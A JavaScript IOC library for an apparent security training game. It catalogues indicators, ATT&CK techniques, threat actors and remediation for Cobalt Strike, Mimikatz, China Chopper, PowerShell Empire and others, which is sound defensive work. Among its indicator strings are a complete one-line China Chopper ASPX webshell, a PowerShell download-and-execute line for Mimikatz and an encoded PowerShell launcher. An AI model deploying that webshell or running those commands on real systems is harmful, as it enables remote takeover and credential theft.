/**
 * IOC Library - Backed by Real Threat Intelligence
 * Based on MITRE ATT&CK, CISA advisories, and real-world threat data
 *
 * Each IOC includes:
 * - Detection indicators
 * - Associated threat actors
 * - MITRE ATT&CK techniques
 * - Remediation steps
 */

class IOCLibrary {
  constructor() {
    this.iocs = this.initializeIOCDatabase();
    this.attackMappings = this.initializeAttackMappings();
  }

  initializeIOCDatabase() {
    return {
      // ==================== COBALT STRIKE ====================
      'cobalt_strike': {
        name: 'Cobalt Strike',
        category: 'C2 Framework',
        severity: 'critical',
        description: 'Post-exploitation framework used by APT groups and ransomware operators',

        networkIOCs: [
          {
            type: 'network_traffic',
            indicator: 'Uniform, bot-generated HTTP patterns (consistent timing)',
            details: 'HTTP traffic lacks human variance - requests occur at exact intervals',
            detection: 'Analyze HTTP timing patterns for consistency over 5+ minute periods'
          },
          {
            type: 'http_header',
            indicator: 'Suspicious HTTP Host headers with malleable C2 profiles',
            details: 'Custom User-Agent strings like "Mozilla/5.0 (compatible; MSIE 9.0)"',
            detection: 'Monitor for outdated or unusual User-Agent strings'
          },
          {
            type: 'c2_beacon',
            indicator: 'Beaconing to external IPs on ports 80, 443, 8080',
            details: 'Regular outbound connections with encrypted payloads',
            detection: 'Look for periodic connections to same external IP (jitter pattern)'
          },
          {
            type: 'dns',
            indicator: 'DNS queries to suspicious domains with CS beacon configs',
            details: 'Example: update.microsoft-analytics[.]com',
            detection: 'Monitor DNS for typosquatted legitimate domains'
          }
        ],

        hostIOCs: [
          {
            type: 'process',
            indicator: 'Rundll32.exe executing beacon DLL',
            details: 'Process: rundll32.exe [beacon].dll,StartW',
            detection: 'Monitor rundll32 with unusual DLL paths or arguments'
          },
          {
            type: 'memory',
            indicator: 'Beacon shellcode injected into legitimate processes',
            details: 'Common targets: explorer.exe, svchost.exe, iexplore.exe',
            detection: 'Scan process memory for CS beacon signatures'
          },
          {
            type: 'named_pipe',
            indicator: 'Named pipes: \\.\pipe\msagent_*, \\.\pipe\MSSE-*',
            details: 'Default CS named pipes for SMB beacons',
            detection: 'Monitor named pipe creation with MSSE/msagent prefixes'
          },
          {
            type: 'file',
            indicator: 'Suspicious files in temp: beacon.dll, artifact.exe',
            details: 'Files dropped in C:\\Windows\\Temp or %APPDATA%',
            detection: 'Monitor temp directories for unsigned DLLs'
          }
        ],

        mitreAttack: [
          'T1071.001', // Application Layer Protocol: Web Protocols
          'T1573.001', // Encrypted Channel: Symmetric Cryptography
          'T1090.002', // Proxy: External Proxy
          'T1055',     // Process Injection
          'T1218.011'  // System Binary Proxy Execution: Rundll32
        ],

        threatActors: [
          'APT29 (Cozy Bear)',
          'APT32 (OceanLotus)',
          'FIN7',
          'GoGalocker ransomware group',
          'MegaCortex operators',
          'Maze ransomware group'
        ],

        remediation: [
          'Block C2 IP addresses and domains at firewall',
          'Kill beacon processes and remove persistence',
          'Scan all systems for named pipes matching CS patterns',
          'Reset credentials for all potentially compromised accounts',
          'Isolate infected systems from network',
          'Analyze beacon config to identify infrastructure'
        ]
      },

      // ==================== MIMIKATZ ====================
      'mimikatz': {
        name: 'Mimikatz',
        category: 'Credential Stealer',
        severity: 'critical',
        description: 'Extracts credentials from LSASS memory, enabling lateral movement',

        networkIOCs: [
          {
            type: 'smb',
            indicator: 'Pass-the-hash authentication attempts',
            details: 'NTLM authentication without password - just hash',
            detection: 'Monitor Windows Event 4624 with LogonType 3 and NTLM'
          },
          {
            type: 'kerberos',
            indicator: 'Golden/Silver ticket usage (unusual Kerberos tickets)',
            details: 'Tickets with extended lifetimes (10 years)',
            detection: 'Monitor Event 4768/4769 for unusual ticket properties'
          }
        ],

        hostIOCs: [
          {
            type: 'process',
            indicator: 'mimikatz.exe or renamed variants running',
            details: 'Common names: m64.exe, mi.exe, sekurlsa.exe',
            detection: 'Monitor for LSASS access by non-system processes'
          },
          {
            type: 'lsass_access',
            indicator: 'Suspicious process accessing lsass.exe memory',
            details: 'Process opened LSASS with PROCESS_VM_READ',
            detection: 'Sysmon Event ID 10 - ProcessAccess to lsass.exe'
          },
          {
            type: 'command_line',
            indicator: 'PowerShell Invoke-Mimikatz execution',
            details: 'Command: IEX (New-Object Net.WebClient).DownloadString(...mimikatz.ps1)',
            detection: 'Monitor PowerShell for sekurlsa::logonpasswords commands'
          },
          {
            type: 'registry',
            indicator: 'WDigest UseLogonCredential enabled',
            details: 'Registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential = 1',
            detection: 'Alert on WDigest registry modification'
          },
          {
            type: 'file',
            indicator: 'Output files: passwords.txt, creds.txt, hashes.txt',
            details: 'Mimikatz dumps credentials to text files',
            detection: 'Monitor for files containing "sekurlsa" or credential patterns'
          }
        ],

        mitreAttack: [
          'T1003.001', // OS Credential Dumping: LSASS Memory
          'T1550.002', // Use Alternate Authentication Material: Pass the Hash
          'T1558.001', // Steal or Forge Kerberos Tickets: Golden Ticket
          'T1003.002', // Security Account Manager
          'T1003.004'  // LSA Secrets
        ],

        threatActors: [
          'APT28 (Fancy Bear)',
          'APT29 (Cozy Bear)',
          'Lazarus Group',
          'Cobalt Group',
          'Turla',
          'Carbanak',
          'FIN6',
          'APT21',
          'NotPetya ransomware',
          'BadRabbit ransomware'
        ],

        remediation: [
          'Immediately reset all domain admin passwords',
          'Revoke all Kerberos tickets (force re-authentication)',
          'Enable Protected Process Light for LSASS',
          'Disable WDigest authentication',
          'Enable Credential Guard on Windows 10+',
          'Hunt for Pass-the-Hash activity in Event Logs',
          'Implement LSASS protection via registry',
          'Rebuild all potentially compromised domain controllers'
        ]
      },

      // ==================== CHINA CHOPPER ====================
      'china_chopper': {
        name: 'China Chopper',
        category: 'Web Shell',
        severity: 'high',
        description: 'Tiny one-line webshell used for persistence and remote access',

        networkIOCs: [
          {
            type: 'http_post',
            indicator: 'HTTP POST requests to .aspx/.php files with suspicious parameters',
            details: 'POST to /owa/auth/logon.aspx with base64 encoded commands',
            detection: 'Monitor HTTP POST with eval/execute patterns in body'
          },
          {
            type: 'http_pattern',
            indicator: 'Command terminator: &echo [S]&cd&echo [E]',
            details: 'Signature pattern in all China Chopper virtual terminal requests',
            detection: 'Alert on HTTP bodies containing "&echo [S]&cd&echo [E]"'
          },
          {
            type: 'user_agent',
            indicator: 'China Chopper client user-agent',
            details: 'User-Agent often empty or generic',
            detection: 'Correlate with POST to webshell paths'
          }
        ],

        hostIOCs: [
          {
            type: 'file',
            indicator: 'One-line .aspx or .php webshells',
            details: 'Content: <%@ Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>',
            detection: 'Scan web directories for files with eval/execute in ASPX/PHP'
          },
          {
            type: 'file_location',
            indicator: 'Webshell in OAB (Offline Address Book) directory',
            details: 'Path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\OAB\\',
            detection: 'Monitor OAB directory for unexpected .aspx files'
          },
          {
            type: 'iis_logs',
            indicator: 'IIS logs showing POST to same file repeatedly',
            details: 'Example: POST /owa/auth/logon.aspx - 200 OK (repeated every few seconds)',
            detection: 'Parse IIS logs for high POST frequency to single file'
          },
          {
            type: 'process',
            indicator: 'w3wp.exe spawning cmd.exe or powershell.exe',
            details: 'IIS worker process executing OS commands',
            detection: 'Monitor process tree: w3wp.exe → cmd.exe'
          },
          {
            type: 'registry',
            indicator: 'ExternalUrl field in OAB config contains webshell path',
            details: 'Exchange OAB configuration modified by attacker',
            detection: 'Check OAB ExternalUrl in Exchange config'
          }
        ],

        mitreAttack: [
          'T1505.003', // Server Software Component: Web Shell
          'T1190',     // Exploit Public-Facing Application
          'T1059.003', // Command and Scripting Interpreter: Windows Command Shell
          'T1071.001', // Application Layer Protocol: Web Protocols
          'T1027'      // Obfuscated Files or Information
        ],

        threatActors: [
          'Emissary Panda (APT27)',
          'Deep Panda (APT19)',
          'APT40 (Leviathan)',
          'Hafnium (Exchange Server attackers)',
          'Chinese APT groups (general)'
        ],

        remediation: [
          'Delete webshell files from web directories',
          'Patch Exchange Server vulnerabilities (ProxyLogon, ProxyShell)',
          'Review IIS logs for all accessed files',
          'Check for other webshells using YARA rules',
          'Reset all OAB configurations',
          'Change all administrator passwords',
          'Scan entire web server for backdoors',
          'Block attacker IP addresses'
        ]
      },

      // ==================== POWERSHELL EMPIRE ====================
      'powershell_empire': {
        name: 'PowerShell Empire',
        category: 'Post-Exploitation Framework',
        severity: 'critical',
        description: 'PowerShell-based C2 framework for lateral movement and persistence',

        networkIOCs: [
          {
            type: 'c2_beacon',
            indicator: 'PowerShell beaconing to C2 server',
            details: 'HTTPS connections with encrypted Empire traffic',
            detection: 'Monitor outbound PowerShell connections'
          },
          {
            type: 'http_pattern',
            indicator: 'Empire default URI patterns: /admin/get.php, /news.php',
            details: 'HTTP GET/POST to Empire C2 endpoints',
            detection: 'Block known Empire C2 URI patterns'
          },
          {
            type: 'tls',
            indicator: 'Self-signed certificates on C2 servers',
            details: 'Empire often uses self-signed certs for HTTPS',
            detection: 'Alert on connections to self-signed cert servers'
          }
        ],

        hostIOCs: [
          {
            type: 'powershell',
            indicator: 'Encoded PowerShell commands (base64)',
            details: 'Command: powershell.exe -enc JAB2AHoAVgBBAD0AKA...',
            detection: 'Monitor Event 4104 for encoded PowerShell execution'
          },
          {
            type: 'process',
            indicator: 'PowerShell with suspicious arguments',
            details: 'Flags: -NoP -sta -NonI -W Hidden -Enc',
            detection: 'Alert on PowerShell with hidden/non-interactive flags'
          },
          {
            type: 'registry',
            indicator: 'Registry persistence keys',
            details: 'Path: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            detection: 'Monitor registry Run keys for PowerShell payloads'
          },
          {
            type: 'wmi',
            indicator: 'WMI event subscriptions for persistence',
            details: 'WMI event filter executing PowerShell',
            detection: 'Enumerate WMI event subscriptions'
          },
          {
            type: 'scheduled_task',
            indicator: 'Scheduled tasks launching PowerShell',
            details: 'Task action: powershell.exe with Empire launcher',
            detection: 'Monitor schtasks.exe and Task Scheduler logs'
          },
          {
            type: 'event_log',
            indicator: 'PowerShell ScriptBlock logging (Event 4104)',
            details: 'Logs showing Invoke-Empire, Get-Keystrokes, etc.',
            detection: 'Enable and monitor PowerShell script block logging'
          },
          {
            type: 'memory',
            indicator: 'Empire agent in PowerShell process memory',
            details: 'Reflective PE loading - no files on disk',
            detection: 'Memory scan for Empire module signatures'
          }
        ],

        mitreAttack: [
          'T1059.001', // PowerShell
          'T1071.001', // Web Protocols
          'T1547.001', // Registry Run Keys
          'T1546.003', // WMI Event Subscription
          'T1053.005', // Scheduled Task
          'T1055',     // Process Injection
          'T1027',     // Obfuscated Files
          'T1140'      // Deobfuscate/Decode Files
        ],

        threatActors: [
          'APT19 (Deep Panda)',
          'APT29',
          'FIN7',
          'Various ransomware groups',
          'Penetration testers (legitimate use)'
        ],

        remediation: [
          'Enable PowerShell Constrained Language Mode',
          'Enable Script Block Logging and Transcription',
          'Remove PowerShell v2 (bypass protection)',
          'Implement Application Whitelisting',
          'Kill PowerShell processes with suspicious arguments',
          'Remove registry persistence keys',
          'Delete WMI event subscriptions',
          'Reset credentials for compromised accounts',
          'Block C2 domains/IPs'
        ]
      },

      // ==================== JBIFROST RAT ====================
      'jbifrost': {
        name: 'jBifrost RAT',
        category: 'Remote Access Trojan',
        severity: 'high',
        description: 'Java-based RAT with keylogging, screenshot capture, and remote control',

        networkIOCs: [
          {
            type: 'c2_connection',
            indicator: 'Outbound connection to RAT C2 on custom ports',
            details: 'Typically TCP ports: 81, 1337, 8080, or custom',
            detection: 'Monitor Java processes for unusual network connections'
          },
          {
            type: 'data_exfil',
            indicator: 'Upload of screenshots and keystroke logs',
            details: 'Large outbound data transfers from Java process',
            detection: 'Monitor for file uploads from javaw.exe'
          }
        ],

        hostIOCs: [
          {
            type: 'file',
            indicator: 'jBifrost .jar files',
            details: 'Files: server.jar, bifrost.jar, config.xml',
            detection: 'Scan for suspicious JAR files in temp/appdata'
          },
          {
            type: 'process',
            indicator: 'javaw.exe or java.exe running RAT payload',
            details: 'Command: javaw.exe -jar server.jar',
            detection: 'Monitor Java processes with suspicious parent processes'
          },
          {
            type: 'registry',
            indicator: 'Persistence via Run key or Startup folder',
            details: 'Autorun entry for Java with .jar parameter',
            detection: 'Check autorun locations for Java payloads'
          },
          {
            type: 'keylog_file',
            indicator: 'Keystroke log files',
            details: 'Files: logs.txt, keys.dat in hidden directories',
            detection: 'Search for hidden files with keystroke patterns'
          },
          {
            type: 'screenshot',
            indicator: 'Automated screenshot captures',
            details: 'Screenshot files in temp with timestamps',
            detection: 'Monitor temp directories for sequential images'
          }
        ],

        mitreAttack: [
          'T1056.001', // Input Capture: Keylogging
          'T1113',     // Screen Capture
          'T1219',     // Remote Access Software
          'T1071.001', // Web Protocols
          'T1547.001'  // Registry Run Keys
        ],

        threatActors: [
          'APT groups targeting Middle East',
          'Financially motivated cybercriminals',
          'Espionage campaigns'
        ],

        remediation: [
          'Terminate Java processes running RAT',
          'Delete JAR files and config files',
          'Remove registry persistence',
          'Scan for and delete keystroke logs',
          'Reset all passwords (assume compromised)',
          'Block C2 IP addresses',
          'Review Java security policies'
        ]
      },

      // ==================== HUC PACKET TRANSMITTER ====================
      'huc_packet': {
        name: 'HUC Packet Transmitter',
        category: 'C2 Obfuscation / Data Exfiltration',
        severity: 'high',
        description: 'Custom packet manipulation tool for covert C2 and data exfiltration',

        networkIOCs: [
          {
            type: 'custom_protocol',
            indicator: 'Non-standard protocol usage or protocol tunneling',
            details: 'ICMP tunneling, DNS tunneling, or custom ports',
            detection: 'Monitor for unusual ICMP/DNS traffic volumes'
          },
          {
            type: 'packet_fragmentation',
            indicator: 'Unusual packet fragmentation patterns',
            details: 'Data split across many small packets',
            detection: 'Analyze packet sizes and fragmentation'
          },
          {
            type: 'timing',
            indicator: 'Slow and low exfiltration (stealth transfer)',
            details: 'Small amounts of data over long periods',
            detection: 'Baseline network behavior and detect anomalies'
          },
          {
            type: 'encoding',
            indicator: 'Base64 or custom encoding in packet payloads',
            details: 'Encoded data in DNS TXT records or ICMP data',
            detection: 'DPI for encoded data patterns'
          }
        ],

        hostIOCs: [
          {
            type: 'process',
            indicator: 'Process with raw socket access',
            details: 'Applications creating raw sockets (admin privilege)',
            detection: 'Monitor for SOCK_RAW socket creation'
          },
          {
            type: 'file',
            indicator: 'Custom packet crafting tools',
            details: 'Tools like hping3, scapy, or custom binaries',
            detection: 'Monitor for packet crafting tool execution'
          },
          {
            type: 'pcap_lib',
            indicator: 'Loading of packet capture libraries',
            details: 'WinPcap, Npcap, libpcap loaded by unusual process',
            detection: 'Monitor DLL loads for packet capture libraries'
          }
        ],

        mitreAttack: [
          'T1572',     // Protocol Tunneling
          'T1071.004', // DNS
          'T1048.003', // Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
          'T1001.001', // Junk Data
          'T1095'      // Non-Application Layer Protocol
        ],

        threatActors: [
          'Advanced APT groups',
          'Nation-state actors',
          'Custom malware developers'
        ],

        remediation: [
          'Block ICMP/DNS tunneling at firewall',
          'Implement DPI for encoded traffic',
          'Monitor and restrict raw socket usage',
          'Analyze DNS query patterns for tunneling',
          'Use network behavior analytics',
          'Restrict outbound protocols to approved only'
        ]
      }
    };
  }

  /**
   * Maps IOC patterns to attack scenarios
   * This is used for the detection game mechanic
   */
  initializeAttackMappings() {
    return {
      // If you see THIS pattern, it indicates THIS attack
      detectionPatterns: [
        {
          pattern: 'Beaconing traffic every 60 seconds with jitter',
          indicates: ['cobalt_strike', 'powershell_empire'],
          confidence: 'high',
          reasoning: 'C2 frameworks use regular beaconing with jitter to blend in'
        },
        {
          pattern: 'lsass.exe memory accessed by PowerShell',
          indicates: ['mimikatz'],
          confidence: 'very_high',
          reasoning: 'Mimikatz is loaded via PowerShell to dump LSASS credentials'
        },
        {
          pattern: 'HTTP POST with "&echo [S]&cd&echo [E]" pattern',
          indicates: ['china_chopper'],
          confidence: 'very_high',
          reasoning: 'This is China Chopper signature command pattern'
        },
        {
          pattern: 'PowerShell -enc with hidden window',
          indicates: ['powershell_empire', 'cobalt_strike'],
          confidence: 'high',
          reasoning: 'Encoded PowerShell with stealth flags indicates C2 framework'
        },
        {
          pattern: 'Named pipe creation: \\\\.\pipe\MSSE-*',
          indicates: ['cobalt_strike'],
          confidence: 'very_high',
          reasoning: 'Default Cobalt Strike SMB beacon named pipe pattern'
        },
        {
          pattern: 'javaw.exe making external connections on port 1337',
          indicates: ['jbifrost'],
          confidence: 'high',
          reasoning: 'jBifrost RAT commonly uses Java with port 1337 for C2'
        },
        {
          pattern: 'Excessive DNS TXT queries with base64 data',
          indicates: ['huc_packet', 'dns_tunneling'],
          confidence: 'high',
          reasoning: 'DNS tunneling for C2 or exfiltration'
        },
        {
          pattern: 'w3wp.exe spawning cmd.exe',
          indicates: ['china_chopper', 'webshell'],
          confidence: 'high',
          reasoning: 'IIS worker process should not spawn command shells'
        },
        {
          pattern: 'Registry Run key with PowerShell payload',
          indicates: ['powershell_empire'],
          confidence: 'medium',
          reasoning: 'Empire uses registry for persistence'
        },
        {
          pattern: 'Kerberos ticket with 10-year lifetime',
          indicates: ['mimikatz'],
          confidence: 'very_high',
          reasoning: 'Golden ticket attack - forged Kerberos ticket'
        }
      ]
    };
  }

  /**
   * Get IOC details by ID
   */
  getIOC(iocId) {
    return this.iocs[iocId] || null;
  }

  /**
   * Search IOCs by category
   */
  getIOCsByCategory(category) {
    return Object.values(this.iocs).filter(ioc => ioc.category === category);
  }

  /**
   * Find what attack an indicator suggests
   */
  analyzeIndicator(pattern) {
    const matches = this.attackMappings.detectionPatterns.filter(p =>
      p.pattern.toLowerCase().includes(pattern.toLowerCase()) ||
      pattern.toLowerCase().includes(p.pattern.toLowerCase())
    );

    return matches.map(match => ({
      ...match,
      iocDetails: match.indicates.map(id => this.getIOC(id))
    }));
  }

  /**
   * Get all IOCs associated with a threat actor
   */
  getIOCsByThreatActor(actor) {
    return Object.entries(this.iocs)
      .filter(([, ioc]) => ioc.threatActors.some(a =>
        a.toLowerCase().includes(actor.toLowerCase())
      ))
      .map(([id, ioc]) => ({ id, ...ioc }));
  }

  /**
   * Get remediation steps for an IOC
   */
  getRemediation(iocId) {
    const ioc = this.getIOC(iocId);
    return ioc ? ioc.remediation : [];
  }

  /**
   * Generate training scenario from IOC
   */
  generateScenarioFromIOC(iocId) {
    const ioc = this.getIOC(iocId);
    if (!ioc) return null;

    return {
      iocId,
      title: `Detect and Respond: ${ioc.name}`,
      description: ioc.description,
      difficulty: ioc.severity,
      objectives: [
        `Identify ${ioc.name} indicators in SIEM logs`,
        'Correlate indicators with MITRE ATT&CK techniques',
        'Execute proper remediation steps',
        'Document lessons learned'
      ],
      indicators: [...ioc.networkIOCs, ...ioc.hostIOCs],
      mitreAttack: ioc.mitreAttack,
      threatActors: ioc.threatActors
    };
  }

  /**
   * Get all IOC data as JSON for export
   */
  exportIOCs() {
    return JSON.stringify(this.iocs, null, 2);
  }
}

// Export for use in main game
if (typeof module !== 'undefined' && module.exports) {
  module.exports = IOCLibrary;
}
